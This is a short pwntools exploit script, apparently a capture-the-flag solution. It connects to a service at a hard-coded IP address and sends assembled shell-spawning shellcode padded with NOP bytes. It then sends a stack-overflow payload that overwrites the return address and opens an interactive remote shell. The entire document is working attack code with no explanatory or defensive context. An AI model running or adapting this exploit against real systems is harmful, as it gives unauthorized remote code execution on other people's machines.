from pwn import *

context.arch = "amd64"
context.log_level = "debug"
p = remote("9.205.18.45", 5000)

sc = asm(shellcraft.sh())
p.send(sc.ljust(128, b"\x90"))

payload = b"A" * 72 + p64(0x13370000)
p.send(payload)

p.interactive()
